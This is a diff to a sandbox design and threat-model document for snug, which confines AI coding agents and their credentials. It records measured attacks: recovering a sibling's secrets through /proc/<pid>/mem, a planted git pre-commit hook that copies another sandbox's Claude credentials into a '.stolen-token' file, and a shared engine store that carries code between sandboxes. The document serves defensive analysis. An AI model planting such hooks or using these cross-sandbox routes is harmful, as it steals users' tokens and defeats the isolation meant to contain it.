@@ -2,10 +2,11 @@
 
 How a credential the host holds is made useful to code snug does not trust.
 
-**[M]** measured on this host 2026-09-01 · **[M-prior]** measured 2026-08-13 and
-not re-measured since · **[R]** read from source or a vendor bundle, not
-executed. Versions at measurement: snug `f47beda`, claude 2.1.252, gh 2.98.0,
-podman 6.0.2, bwrap 0.11.2, git 2.55.0, Go 1.27.0, kernel 7.2.0.
+**[M]** measured on this host, 2026-09-01 or 2026-09-06 · **[M-prior]** measured
+2026-08-13 and not re-measured since · **[R]** read from source or a vendor
+bundle, not executed. Versions at measurement: snug `f47beda` then `18a3aff`,
+claude 2.1.252 then 2.1.263, gh 2.98.0, podman 6.0.2, bwrap 0.11.2, git 2.55.0,
+Go 1.27.0, kernel 7.2.0.
 
 The distinction is not bookkeeping. A carried measurement is one nobody has run
 against this tree, and at least one of the ones below was **wrong** when re-read:
@@ -767,6 +768,31 @@ the design:
   not extend sync-back to any other credential without a structural validator,
   and prefer having no such channel at all.
 
+**`/login` inside works, and what it mints is not what snug staged.** The staged
+file is `KindData, AccessRW` (`internal/cli/claude.go`) and bwrap emits `--file`
+for that combination (`internal/policy/bwrap.go`) — a real file copied onto the
+tmpfs `$HOME`, not a bind mount — so the client's own write path works.
+Measured **[M]** what that path requires: write-then-rename via
+`.credentials.json.tmp.<8 hex>` plus two mkdir locks, `.oauth_refresh.lock` and
+`.storage-write.lock`, so the containing **directory** must be writable and not
+merely the file. With the directory read-only the client makes no token request
+at all and sends the expired bearer anyway, exit 0 — a silent downgrade on the
+client's side, which is worth knowing precisely because it is not snug's to fix.
+Measured **[M]** that no browser or forwarded port is needed: the callback port
+is ephemeral (`127.0.0.1:33723`, `:32779`, `:38341` over three runs;
+`listen(e??0,"127.0.0.1")` **[R]**), so `publish` cannot forward it, but the URL
+the client prints carries
+`redirect_uri=https://platform.claude.com/oauth/code/callback` and offers
+`Paste code here if prompted >`.
+
+A credential minted that way carries a **`refreshToken`** — the half §2 drops
+from the staged projection. That is accepted: it is authored inside, it lives in
+the sandbox's tmpfs, and it dies with the run. It is not a reversal of the rule
+above, which refuses staging the HOST's refresh token and refuses sync-back;
+both still hold, and nothing writes the host's file. What bounds the minted one
+is the run's lifetime and §8's list of what a run can hand sideways before it
+ends.
+
 **Residual egress, and it is the same sentence facing two ways. [M]** With the
 socket set *and network available*, eleven TLS connections still bypass it:
 `api.anthropic.com:443` ×10 and `http-intake.logs.us5.datadoghq.com:443`.
@@ -941,8 +967,21 @@ readable by every other process there via `/proc/<pid>/mem`, which the seccomp
 this tree: a sibling's sentinel string was recovered by walking
 `/proc/<pid>/maps` and reading `/proc/<pid>/mem`, with `CapEff` zero. Execute-only modes do not help and the payload can
 `LD_PRELOAD` a stub's children. The answer is not a uid — §5.2 refuses that — but
-**not being in that pid namespace**: P0 or a sibling sandbox, which is why a stub
+**not being in that pid namespace**: P0 or a second sandbox, which is why a stub
 that *holds* the token is never a placement.
+
+**And "not in that pid namespace" is now structural rather than a rule to
+observe.** snug has no verb that places a process into a running sandbox's
+namespaces: a second session on a target is a second sandbox. The route that
+would have made the placement tempting was measured shut on the way to deleting
+it — a private mount namespace hides a path from the host's view but not from a
+same-uid process that can name the pid (`/proc/<pid>/root` takes
+`PTRACE_MODE_READ`, which Yama does not gate), and making that privacy real
+needs a private `/proc` the payload's user namespace cannot mount:
+`mount("proc", …)` is **EPERM** from a descendant userns while bwrap's locked
+procfs is in the mount namespace, with `tmpfs` succeeding in the same place as
+the discriminator. The only namespace that can mount it is the mount-owning one,
+and a process there holds `CAP_SYS_ADMIN` over the sandbox's own mounts.
 
 ### 7.7 An abstract-namespace socket for anything inside the sandbox
 
@@ -977,6 +1016,33 @@ namespaces at all.
   thing in that directory. "Secrets are never injected" must never be read as "the
   sandbox cannot get your secrets": it cannot get them *now*, and it can arrange
   to be handed them later.
+
+  **And it points sideways as well as at the host, which is the direction a
+  reader does not arrive expecting.** The other end does not have to be you: it
+  can be another sandbox on the same target, and the victim cooperates in nothing
+  beyond doing its job. Measured **[M]**, three runs on one target with a
+  synthetic credential: a run with `@cwd-rw` and no credential of its own writes
+  `.git/hooks/pre-commit` carrying `cp "$HOME/.claude/.credentials.json"
+  ./.stolen-token`; a `@claude` run then does an ordinary `git commit`, git fires
+  the hook, and the first run reads the second's `accessToken` out of the target.
+  `dedaf7a` (#460) narrows two Claude-specific channels — the settings `hooks`
+  block and `.mcp.json` — and reaches none of `.git/hooks`, `Makefile`,
+  `CLAUDE.md`, `.envrc` or `package.json`. What bounded this was §1's projection
+  and nothing else: the file the hook copied carries no `refreshToken`, so what
+  moved expires in hours.
+
+- **The engine store, when a `@podman*` profile is selected, and it carries
+  execution rather than bytes.** `/snug/engine/store` and
+  `/snug/engine/runroot` are `KindGraft, AccessRW`, keyed by the target hash
+  **alone** — the profile set was deliberately removed from the key (#276) — so
+  every sandbox on one target grafts the same host store read-write. Measured
+  **[M]**: `--dry-run -v -p @podman-socket` renders the store under
+  `sha256_99b8079d…`, the same digest the target's own runtime state is keyed by.
+  A layer one sandbox's engine pulls or builds is a layer the next one's engine
+  runs. This is worth stating separately from the bullet above because an
+  enumeration of the shared surface written over `p.Mounts` cannot see it: a
+  `KindGraft` in `p.Mounts` is refused by `internal/policy/validate.go`, so the
+  store lives in `p.Grafts` and a mount-set sweep is blind to it by construction.
 - **Intent.** A broker pins the identity and the operation set. It cannot pin what
   the agent asks for within them, and quota theft while the run lasts is
   unaffected.
